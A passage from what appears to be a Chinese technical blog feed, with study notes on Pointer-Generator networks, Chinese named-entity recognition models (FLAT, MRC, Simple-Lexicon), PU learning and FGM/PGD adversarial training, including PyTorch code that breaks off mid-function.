      <url>/posts/6875388b.html</url>
      
        <content type="html"><![CDATA[<p>回顾一下Pointer network</p><h3><span id="pointer-what">Pointer ? What ?</span></h3><p>从一堆点中，找出 凸包 边界点。</p><p>convex hull：一条圈住所有点的橡皮筋</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317125843457.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><h3><span id="seq-generation-bad">Seq generation bad</span></h3><p>seq2seq，在处理生成任务时，无法处理 OOV问题。可以理解为，在decode时映射的词表vocabulary是变化的。</p><h3><span id="how-to-solve">How to solve？</span></h3><p>[^]: <em><a href="https://arxiv.org/abs/1704.04368" target="_blank" rel="noopener">Get To The Point:Summarization with Pointer-Generator Networks</a></em></p><p>假如，将输入text中每个word当做一个点，seq2seq任务转换为在输入的文本中找到一个“convex hull” 可以summarize整个输入的语义内容，是否可行？</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317212740970.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>输出全都从 输入 中 copy。</p><p>根据输入的语义表示，用一个language model输出生成文本。</p><p>假如要保持 decoder 的languagemodel的泛化生成能力，同时copy一些输入中的重要信息。模型被修改为下面这样</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317215702538.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>输出为：联合 source text 中的attention distribution 和decoder在vocabulary上的预测分布，以 Pgen 加权的结果。</p><p>Final distribution的分布中是包含了 source text 和 vocabulary中的所有词的。</p><p>同时，<span class="math inline">\(P_{gen}\)</span>设计为可学习的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317215726773.png" srcset="/img/loading.gif" lazyload></p><h3><span id="reduce-repeats">Reduce repeats？</span></h3><p>将 attention distribution进行历史累计，在下一步计算attention时输入。即，Coverage Mechanism。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317225323374.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317225348360.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317225406702.png" srcset="/img/loading.gif" lazyload></p><p>同时，添加新的损失项。让模型不要过分关注某些词。：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317225512967.png" srcset="/img/loading.gif" lazyload></p><p>最终损失为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/pointer_review_pic/image-20210317225636523.png" srcset="/img/loading.gif" lazyload></p><h3><span id="more">More</span></h3><p>注意事项:</p><p>（1）在模型训练到一定程度后，再使用Coverage Mechanism。</p><p>（2）在模型的训练环节，刚开始的时候，大约有70%的输出序列是由PointerNetwork产生的，随着模型逐渐收敛，这个概率下降到47%。然而，在测试环节中，有83%的输出序列是由PointerNetwork产生的。作者猜测这个差异的原因在于：训练环节的decoder使用了真实的目标序列。</p><p>（3）作者曾尝试使用一个15万长度的大词表，但是并不能显著改善模型效果。</p><p><a href="https://github.com/RacleRay/TextSummerization/tree/master/pointer">Code</a></p><p>其他同类模型：</p><ol type="1"><li>将LM部分也变为 attention ，进行多个 source text 的输入的生成任务。<a href="https://arxiv.org/abs/1808.06885">Multi-Source PointerNetwork</a></li><li>不计算 <span class="math inline">\(P_{gen}\)</span> ，而直接分成多种情况，进行不同的 生成过程。<a href="https://arxiv.org/abs/1603.06393">CopyNet</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deep learning </tag>
            
            <tag> pointer net </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实体识别模型与策略2020</title>
      <link href="/posts/548512d6.html"/>
      <url>/posts/548512d6.html</url>
      
        <content type="html"><![CDATA[<h2><span id="模型">模型</span></h2><h3><span id="flat">FLAT</span></h3><p>FLAT部分Blog原文：https://mp.weixin.qq.com/s/6aU6ZDYPWPHc3KssuzArKw</p><p>论文：FLAT: Chinese NER Using Flat-Lattice Transformer</p><p>将Lattice图结构无损转换为扁平的Flat结构的方法，并将LSTM替换为了更先进的TransformerEncoder，更好地建模了序列的<strong>长期依赖关系</strong>；</p><p>提出了一种针对Flat结构的<strong>相对位置编码机制</strong>，使得字符与词汇信息交互更直接，在基于词典的中文NER模型中取得了SOTA。</p><p>由于中文词汇的稀疏性和模糊性，基于字符的序列标注模型往往比基于词汇的序列标注模型表现更好，但在基于字符的模型中引入<strong>分词信息</strong>往往能够带来性能的提升，尤其是对于NER任务来说，词汇能够提供丰富的实体边界信息。</p><p>LatticeLSTM首次提出使用Lattice结构在NER任务中融入词汇信息，如图所示，一个句子的Lattice结构是一个有向无环图，每个节点是一个字或者一个词。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220165643972.png" srcset="/img/loading.gif" lazyload></p><h4><span id="设计适应lattice结构的模型">设计适应Lattice结构的模型</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220165700873.png" srcset="/img/loading.gif" lazyload></p><p>Lattice LSTM (ACL 2018):将词汇信息引入中文NER的开篇之作，作者将词节点编码为向量，并在字节点以注意力的方式融合词向量。</p><p>Lexicon Rethink CNN(IJCAI 2019):作者提出了含有rethink机制的CNN网络解决Lattice LSTM的词汇冲突问题。</p><p>RNN和CNN难以建模长距离的依赖关系，且在LatticeLSTM中的字符只能获取前向信息，没有和词汇进行足够充分的全局交互</p><h4><span id="flat">FLAT</span></h4><p><a href="https://github.com/LeeSureman/Flat-Lattice-Transformer" target="_blank" rel="noopener">GitRepo</a></p><p>从Transformer的positionrepresentation得到启发，作者给每一个token/span(字、词)增加了两个位置编码，分别表示该span在sentence中开始(head)和结束(tail)的位置</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220165716666.png" srcset="/img/loading.gif" lazyload></p><p>扁平的结构允许我们使用TransformerEncoder，其中的self-attention机制允许任何字符和词汇进行直接的交互</p><h4><span id="relative-position-encodingof-spans">Relative Position Encodingof Spans</span></h4><p>span是字符和词汇的总称，span之间存在三种关系：交叉、包含、分离，然而作者没有直接编码这些位置关系，而是将其表示为一个稠密向量。作者用和 表示span的头尾位置坐标，并从四个不同的角度来计算 和 的距离：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220165950494.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220170005373.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220170019854.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220170032945.png" srcset="/img/loading.gif" lazyload></p><p>使用<span class="math inline">\(A^{*}_{i,j}\)</span>代替 tranformer的self attention 中的 <span class="math inline">\(A_{i,j}\)</span>:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220170231288.png" srcset="/img/loading.gif" lazyload></p><p>通过FLAT模型后，取出token的编码表示，将其送入CRF层进行解码得到预测的标签序列。</p><p>论文中给出的结果显示，FLAT相较于一众NER模型，取得了SOTA的效果。同时，使用较大规模数据时，效果更好。在对比实验中发现，字符与包含它的词汇之间的充分交互是很重要的。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiHeadAttention</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, hidden_size, num_heads, scaled=True, attn_dropout=None)</span>:</span><br>        super(MultiHeadAttentionRel, self).__init__()<br><br>        self.hidden_size = hidden_size<br><br>        self.num_heads = num_heads<br>        self.per_head_size = self.hidden_size // self.num_heads<br>        self.scaled = scaled<br>        <span class="hljs-keyword">assert</span> (self.per_head_size * self.num_heads == self.hidden_size)<br><br>        <span class="hljs-comment"># 正常 attention 的 q,k,v 变换矩阵</span><br>        self.w_k = nn.Linear(self.hidden_size, self.hidden_size)<br>        self.w_q = nn.Linear(self.hidden_size, self.hidden_size)<br>        self.w_v = nn.Linear(self.hidden_size, self.hidden_size)<br><br>        <span class="hljs-comment"># 计算 Rij 的权重</span><br>        self.w_r = nn.Linear(self.hidden_size, self.hidden_size)<br><br>        <span class="hljs-comment"># 计算 A* 的权重</span><br>        self.u = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=<span class="hljs-literal">True</span>)<br>        self.v = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=<span class="hljs-literal">True</span>)<br><br>        self.dropout = nn.Dropout(attn_dropout)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, key, query, value, pos, flat_mask)</span>:</span><br>        <span class="hljs-string">"pos 为 自定义的 postion embedding，对应公式的 Rij"</span><br>        batch = key.size(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># 输入线性变换</span><br>        key = self.w_k(key)<br>        query = self.w_q(query)<br>        value = self.w_v(value)<br>        rel_pos_embedding = self.w_r(pos)<br><br>        <span class="hljs-comment">####### 计算 A* 矩阵的方法 和 论文不是完全一致</span><br>        <span class="hljs-comment"># batch, seq_len, n_head, d_head</span><br>        key = torch.reshape(key, [batch, <span class="hljs-number">-1</span>, self.num_heads, self.per_head_size])<br>        query = torch.reshape(query, [batch, <span class="hljs-number">-1</span>, self.num_heads, self.per_head_size])<br>        value = torch.reshape(value, [batch, <span class="hljs-number">-1</span>, self.num_heads, self.per_head_size])<br>        <span class="hljs-comment"># batch, seq_len, seq_len, n_head, d_head</span><br>        rel_pos_embedding = torch.reshape(rel_pos_embedding,<br>                                          list(rel_pos_embedding.size()[:<span class="hljs-number">3</span>]) + [self.num_heads, self.per_head_size])<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, d_head</span><br>        key = key.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>        query = query.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>        value = value.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><br>        <span class="hljs-comment"># batch, n_head, d_head, seq_len</span><br>        key = key.transpose(<span class="hljs-number">-1</span>, <span class="hljs-number">-2</span>)<br><br>        <span class="hljs-comment"># 1, num_heads, 1, d_head</span><br>        u_for_c = self.u.unsqueeze(<span class="hljs-number">0</span>).unsqueeze(<span class="hljs-number">-2</span>)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, d_head</span><br>        query_and_u_for_c = query + u_for_c<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len</span><br>        A_C = torch.matmul(query_and_u_for_c, key)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, d_head, seq_len</span><br>        rel_pos_embedding_for_b = rel_pos_embedding.permute(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len, 1, d_head</span><br>        query_for_b = query.view([batch, self.num_heads, query.size(<span class="hljs-number">2</span>), <span class="hljs-number">1</span>, self.per_head_size])<br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len, 1, d_head</span><br>        query_for_b_and_v_for_d = query_for_b + self.v.view(<span class="hljs-number">1</span>, self.num_heads, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, self.per_head_size)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len</span><br>        B_D = torch.matmul(query_for_b_and_v_for_d, rel_pos_embedding_for_b).squeeze(<span class="hljs-number">-2</span>)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len</span><br>        attn_score_raw = A_C + B_D<br><br>        <span class="hljs-comment"># 计算 score</span><br>        <span class="hljs-keyword">if</span> self.scaled:<br>            attn_score_raw = attn_score_raw / math.sqrt(self.per_head_size)<br><br>        mask = <span class="hljs-number">1</span> - flat_mask.long().unsqueeze(<span class="hljs-number">1</span>).unsqueeze(<span class="hljs-number">1</span>)<br>        attn_score_raw_masked = attn_score_raw.masked_fill(mask.bool(), <span class="hljs-number">-1e15</span>)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, seq_len</span><br>        attn_score = F.softmax(attn_score_raw_masked, dim=<span class="hljs-number">-1</span>)<br>        attn_score = self.dropout(attn_score)<br><br>        <span class="hljs-comment"># batch, n_head, seq_len, d_head</span><br>        value_weighted_sum = torch.matmul(attn_score, value)<br>        <span class="hljs-comment"># batch, seq_len, n_head, d_head -&gt; batch, seq_len, hidden_size</span><br>        result = value_weighted_sum.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>).contiguous().reshape(batch, <span class="hljs-number">-1</span>, self.hidden_size)<br><br>        <span class="hljs-keyword">return</span> result<br></code></pre></div></td></tr></table></figure><h3><span id="bert">BERT</span></h3><p>教程博客很多，比如 http://jalammar.github.io/illustrated-bert/</p><h3><span id="crf">CRF</span></h3><p>参考 <a href="https://racleray.github.io/2020/11/18/CRF-SimpleNote/">note1</a><a href="https://racleray.github.io/2021/02/22/%E6%B5%85%E6%B6%89%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/#more">note2</a></p><h3><span id="mrc">MRC</span></h3><p>论文：A Unified MRC Framework for Named Entity Recognition</p><p><a href="https://github.com/ShannonAI/mrc-for-flat-nested-ner?utm_source=catalyzex.com">GitRepo</a></p><p>转换为阅读理解（MRC）任务，来解决NER问题。似乎有很多搞研究的，都在尝试将NLP问题转换到MRC框架下，解决问题。</p><p>目的，解决NER中的实体重叠、嵌套关系问题。这是序列建模方式，比较难处理的问题。</p><p>数据，处理为三元组形式：(问题，答案，上下文)</p><blockquote><p>其中，问题：一段对 实体类型的描述文字，多种实体，就有多个问题；答案：为 实体的起始index；上下文就是待识别的整个文本。</p></blockquote><p>模型，使用BERT：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220173026930.png" srcset="/img/loading.gif" lazyload></p><p>每个token预测输出有两个，是否为实体开始字，是否为实体结束字。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220173255967.png" srcset="/img/loading.gif" lazyload></p><p>输出为 2维，是和不是的预测概率。分别对每个位置判断，是否为开始字或者结束字。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220174003119.png" srcset="/img/loading.gif" lazyload></p><p>但是这个两个集合，在有监督数据条件下，即训练时，并没有必要，只在预测推断时使用（推断需要通过下式计算所有组合的概率P）。因为下式：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220174208145.png" srcset="/img/loading.gif" lazyload></p><p>直接根据标注数据的 i, j 对标注部分计算 P。而不用对所有 i, j组合算一次 P。</p><p>损失，多个预测损失之和：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220174356970.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220174404314.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220174417043.png" srcset="/img/loading.gif" lazyload></p><p>权重为超参数。</p><h3><span id="simple-lexicon">Simple-Lexicon</span></h3><p>论文：Simple-Lexicon：Simplify the Usage of Lexicon in ChineseNER</p><p><a href="https://github.com/v-mipeng/LexiconAugmentedNER?utm_source=catalyzex.com">GitRepo</a></p><p>在Embedding信息的输入上进行改进，尝试了多种方式。</p><blockquote><ol type="1"><li><p>Softword：使用分词工具，标记词的BMESO，结合字向量和标记向量输入。存在误差传播问题，无法引入一整个词汇对应wordembedding</p></li><li><p>ExtendSoftword：组合所有字的所有BME，得到可能的词，但是无法复原原始的词汇信息是怎样</p></li><li><p>Soft-lexicon：对当前字符，依次获取BMES对应所有词汇集合。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220182059909.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>根据词频加权词向量，与字向量求和。</p></li></ol></blockquote><p>该模型比Lattice LSTM,WC-LSTM等，在输入embedding上进行改进的模型，效果更好，更容易使用和迁移。</p><h2><span id="策略">策略</span></h2><h3><span id="positive-unlabeledlearning-pu-learning">Positive-unlabeledlearning -- PU Learning</span></h3><blockquote><p>在只有正类和无标记数据的情况下，训练二分类器</p></blockquote><blockquote><p>Method 1 Directly</p><ol type="1"><li>将正样本和部分筛选出的未标记样本分别看作是positive samples和negativesamples</li><li>训练一个分类器，输出样本属于正、负类的概率</li><li>使用训练好的分类器。分类未标注数据，若正类的概率 大于负类的概率，则该未标注样本的更可能为正类</li></ol><p>Method 2 PU bagging</p><ol type="1"><li>将所有正样本和未标记样本进行随机组合 bootstrap 来创建训练集；</li><li>将正样本和未标记样本视为positive和negative，训练一个分类器；</li><li>将分类器应用于不在训练集中的未标记样本 OOB（“out ofbag”），并记录其分数；</li><li>重复上述三个步骤，最后每个未标记样本的分数为每一轮 OOB分数的平均值。</li></ol><p>Method 3</p><p>人工标注一部分确认为负类的数据，训练分类器识别这些 确认为负类的数据。</p><p><a href="https://github.com/phuijse/bagging_pu/blob/master/PU_Learning_simple_example.ipynb">示例</a><a href="https://github.com/roywright/pu_learning/blob/master/circles.ipynb">示例</a></p></blockquote><p>论文：Distantly Supervised Named Entity Recognition usingPositive-Unlabeled Learning，将PU Learning应用在NER任务上 <a href="https://github.com/v-mipeng/LexiconNER">Git Repo</a>：</p><blockquote><ol type="1"><li><p>首先有 未标记数据 Du，实体字典 Dict；</p></li><li><p>使用最大匹配方法，标记一部分Du，是NE则为正类，不是NE则为负类；</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/README_pic/image-20210220164737197.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p></li><li><p>对每一种NE类型（比如，Loc，Nane）训练一个PU分类器（自定义的神经网络模型）；</p></li><li><p>使用多个PU 分类器，对剩余的Du，进行预测，每一个词，取预测概率最大的那一类标记；</p></li><li><p>若某些 词 多次被预测为实体，且每次出现都被预测为同一类实体，那么，将这个词，加入Dict；</p></li><li><p>重复以上步骤，直到Dict不再改变。</p></li></ol></blockquote><h3><span id="fgm">FGM</span></h3><p><a href="https://zhuanlan.zhihu.com/p/91269728" target="_blank" rel="noopener">引用Blog原文</a></p><p>对抗可以作为一种防御机制，并且经过简单的修改，便能用在NLP任务上，提高模型的泛化能力。对抗训练可以写成一个插件的形式，用几行代码就可以在训练中自由地调用。</p><p>在原始输入样本 <img src="https://www.zhihu.com/equation?tex=x" srcset="/img/loading.gif" lazyload>上加一个扰动 <img src="https://www.zhihu.com/equation?tex=+r_%7Badv%7D" srcset="/img/loading.gif" lazyload>，得到对抗样本后，用其进行训练。将输入样本向着损失上升的方向再进一步，得到的对抗样本就能造成更大的损失，提高模型的错误率。问题可以被抽象成这么一个模型：</p><p><img src="https://www.zhihu.com/equation?tex=+%5Cmin_%7B%5Ctheta%7D-%5Clog+P%28y%7Cx%2Br_%7Badv%7D%3B%5Ctheta%29+" srcset="/img/loading.gif" lazyload></p><p>其中， <img src="https://www.zhihu.com/equation?tex=y" srcset="/img/loading.gif" lazyload> 为goldlabel， <img src="https://www.zhihu.com/equation?tex=%5Ctheta" srcset="/img/loading.gif" lazyload>为模型参数。Goodfellow认为，神经网络由于其线性的特点，很容易受到线性扰动的攻击。于是，他提出了Fast Gradient Sign Method (FGSM) ：</p><p><img src="https://www.zhihu.com/equation?tex=r_%7Badv%7D+%3D+%5Cepsilon+%5Ccdot+%5Ctext%7Bsgn%7D%28%5Ctriangledown_x+L%28%5Ctheta%2C+x%2C+y%29%29" srcset="/img/loading.gif" lazyload></p><p>其中， <img src="https://www.zhihu.com/equation?tex=%5Ctext%7Bsgn%7D" srcset="/img/loading.gif" lazyload>为符号函数， <img src="https://www.zhihu.com/equation?tex=L" srcset="/img/loading.gif" lazyload>为损失函数。Goodfellow发现，令 <img src="https://www.zhihu.com/equation?tex=%5Cepsilon%3D0.25" srcset="/img/loading.gif" lazyload>，用这个扰动能给一个单层分类器造成99.9%的错误率。</p><p>Goodfellow还总结了对抗训练的两个作用：</p><ol type="1"><li>提高模型应对恶意对抗样本时的鲁棒性；</li><li>作为一种regularization，减少overfitting，提高泛化能力。</li></ol><p>从优化的视角，问题重新定义成了一个找鞍点的问题，Min-Max：内部损失函数的最大化，外部经验风险的最小化：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cmin_%5Ctheta+%5Cmathbb%7BE%7D_%7B%28x%2C+y%29%5Csim+%5Cmathcal%7BD%7D%7D+%5B%5Cmax_%7Br_%7Badv%7D+%5Cin+%5Cmathcal%7BS%7D%7D+L%28%5Ctheta%2C+x%2Br_%7Badv%7D%2C+y%29%5D" srcset="/img/loading.gif" lazyload></p><ol type="1"><li>内部max是为了找到worst-case的扰动，也就是攻击，其中， <img src="https://www.zhihu.com/equation?tex=L" srcset="/img/loading.gif" lazyload> 为损失函数， <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BS%7D" srcset="/img/loading.gif" lazyload>为扰动的范围空间。</li><li>外部min是为了基于该攻击方式，找到最鲁棒的模型参数，也就是防御，其中<img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BD%7D" srcset="/img/loading.gif" lazyload>是输入样本的分布。</li></ol><p>CV任务的输入是连续的RGB的值，而NLP问题中，输入是离散的单词序列，一般以one-hotvector的形式呈现，如果直接在rawtext上进行扰动，那么扰动的大小和方向可能都没什么意义。Goodfellow在17年的<a href="https://arxiv.org/abs/1605.07725">ICLR</a>中提出了可以在连续的embedding上做扰动。在CV任务，根据经验性的结论，对抗训练往往会使得模型在非对抗样本上的表现变差，然而神奇的是，在NLP任务中，模型的泛化能力反而变强了。</p><p>因此，<strong>在NLP任务中，对抗训练的角色不再是为了防御基于梯度的恶意攻击，反而更多的是作为一种regularization，提高模型的泛化能力</strong>。</p><p>对抗训练，FSGM的修改版本，取消了符号函数，对梯度计算进行scale，而不是只使用+1 或者 -1 代替。</p><blockquote><ol type="1"><li><p>原网络进行一次，前向反向传播，得到梯度g</p></li><li><p>计算embedding矩阵的修正梯度 r:</p><p><span class="math inline">\(r=\frac{\epsilong}{\|g\|_{2}}\)</span></p></li><li><p>输入 embedding + r ，计算对抗梯度 ga</p></li><li><p>将 ga 累加到 g 中，得到 gf</p></li><li><p>恢复原网络的embedding数值，使用 gf 对参数进行更新</p></li></ol></blockquote><p><strong>Projected GradientDescent（PGD）</strong>：<strong>“小步走，多走几步”</strong>，如果走出了扰动半径为<img src="https://www.zhihu.com/equation?tex=%5Cepsilon" srcset="/img/loading.gif" lazyload>的空间，就映射回“球面”上，以保证扰动不要过大。</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Balign%7D+x_%7Bt%2B1%7D+%26%3D+%5CPi_%7Bx%2B%5Cmathcal%7BS%7D%7D%28x_t%2B%5Calpha+g%28x_t%29%2F%7C%7Cg%28x_t%29%7C%7C_2%29+%5C%5C+g%28x_t%29+%26%3D+%5Ctriangledown_x+L%28%5Ctheta%2C+x_t%2C+y%29+%5Cend%7Balign%7D+" srcset="/img/loading.gif" lazyload></p><p>其中 <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BS%7D%3D%7Br%5Cin%5Cmathbb%7BR%7D%5Ed%3A%7C%7Cr%7C%7C_2+%5Cleq+%5Cepsilon%7D" srcset="/img/loading.gif" lazyload>为扰动的约束空间， <img src="https://www.zhihu.com/equation?tex=%5Calpha" srcset="/img/loading.gif" lazyload> 为小步的步长。</p><p>PGD模型能够得到一个<strong>非常低且集中的loss分布</strong>。</p><p>另外在半监督条件下，也可以使用对抗训练方法Virtual AdversarialTraining进行半监督训练。</p><p>示例代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><br>grad_backup = &#123;&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_grad</span><span class="hljs-params">(tensorName)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backward_hook</span><span class="hljs-params">(grad: torch.Tensor)</span>:</span><br>        grad_backup[tensorName] = grad<br><br>    <span class="hljs-keyword">return</span> backward_hook<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PGD</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, model)</span>:</span><br>        self.model = model<br>        self.emb_backup = &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(self,</span></span><br><span class="hljs-function"><span class="hljs-params">               epsilon=<span class="hljs-number">1.</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">               alpha=<span class="hljs-number">0.3</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">               